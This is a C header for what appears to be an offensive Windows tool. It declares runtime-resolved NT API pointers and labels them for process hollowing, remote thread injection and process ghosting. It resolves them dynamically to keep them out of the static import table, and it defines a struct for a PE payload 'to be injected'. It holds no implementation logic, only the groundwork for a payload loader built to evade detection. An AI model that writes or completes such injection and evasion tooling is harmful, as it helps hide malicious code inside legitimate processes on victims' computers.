/*
 * Utility layer for the malinowy_kozaczek project.
 *
 * All NTAPI functions are resolved at runtime from ntdll to avoid
 * static import tables. Calling convention is __stdcall for NTAPI.
 *
 * The error handling model: every function returns NTSTATUS or DWORD.
 * SUCCESS(x) / FAILURE(x) macros abstract the check.
 * DEBUG_PRINT is stripped in release builds.
 */

#pragma once
#ifndef UTILS_H
#define UTILS_H

#include <windows.h>
#include <winternl.h>

#ifdef _DEBUG
    #define DEBUG_PRINT(fmt, ...) \
        { \
            char _dbg_buf[512]; \
            snprintf(_dbg_buf, sizeof(_dbg_buf), fmt, ##__VA_ARGS__); \
            OutputDebugStringA(_dbg_buf); \
        }
#else
    #define DEBUG_PRINT(fmt, ...) ((void)0)
#endif

#define SUCCESS(x)  ((x) >= 0)
#define FAILURE(x)  ((x) < 0)

/* ── Dynamically resolved NTAPI function pointers ── */

/* NtCreateProcessEx — used in process hollowing */
typedef NTSTATUS (NTAPI *pNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    BOOLEAN InheritObjectTable,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    BOOLEAN InJob
);

/* NtUnmapViewOfSection — unmaps original image from target */
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

/* NtCreateSection — creates a section backed by the payload file */
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

/* NtMapViewOfSection — maps section into target process */
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

/* NtClose */
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

/* NtCreateThreadEx — creates remote thread */
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PATTRIBUTE_LIST AttributeList
);

/* NtResumeThread */
typedef NTSTATUS (NTAPI *pNtResumeThread)(HANDLE ThreadHandle, PULONG SuspendCount);

/* NtSuspendProcess */
typedef NTSTATUS (NTAPI *pNtSuspendProcess)(HANDLE ProcessHandle);

/* NtResumeProcess */
typedef NTSTATUS (NTAPI *pNtResumeProcess)(HANDLE ProcessHandle);

/* RtlCreateProcessReflection — creates a "clone" of the current process
   (used in some process ghosting variations) */
typedef NTSTATUS (NTAPI *pRtlCreateProcessReflection)(
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID Argument,
    HANDLE *ReflectionProcessHandle,
    HANDLE *ReflectionThreadHandle
);

/* ── Helper macros for dynamic resolution ── */

#define RESOLVE_NTAPI(lib, name, ptr) \
    do { \
        *(FARPROC*)&(ptr) = GetProcAddress((lib), (name)); \
        if ((ptr) == NULL) { \
            DEBUG_PRINT("Failed to resolve %s\n", (name)); \
            return 1; \
        } \
    } while(0)

#define RESOLVE_NTAPI_VOID(lib, name, ptr) \
    do { \
        *(FARPROC*)&(ptr) = GetProcAddress((lib), (name)); \
    } while(0)

/* ── NTSTATUS helper ── */
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NT_FAILURE(Status) (!NT_SUCCESS(Status))

/* ── Structure for a payload to be injected ── */
typedef struct _PAYLOAD_IMAGE {
    PVOID  pImage;       /* Raw PE image in memory */
    SIZE_T szImage;      /* Size of the image */
    DWORD  dwEntryPoint; /* Relative virtual address of entry point */
    PVOID  pPreferredBase;
} PAYLOAD_IMAGE, *PPAYLOAD_IMAGE;

/* ── Initialization ── */
BOOL utils_initialize(void);

/* ── Externally visible function pointers ── */
extern pNtCreateProcessEx       fnNtCreateProcessEx;
extern pNtUnmapViewOfSection    fnNtUnmapViewOfSection;
extern pNtCreateSection         fnNtCreateSection;
extern pNtMapViewOfSection      fnNtMapViewOfSection;
extern pNtClose                 fnNtClose;
extern pNtCreateThreadEx        fnNtCreateThreadEx;
extern pNtResumeThread          fnNtResumeThread;
extern pNtSuspendProcess        fnNtSuspendProcess;
extern pNtResumeProcess         fnNtResumeProcess;
extern pRtlCreateProcessReflection fnRtlCreateProcessReflection;

#endif /* UTILS_H */
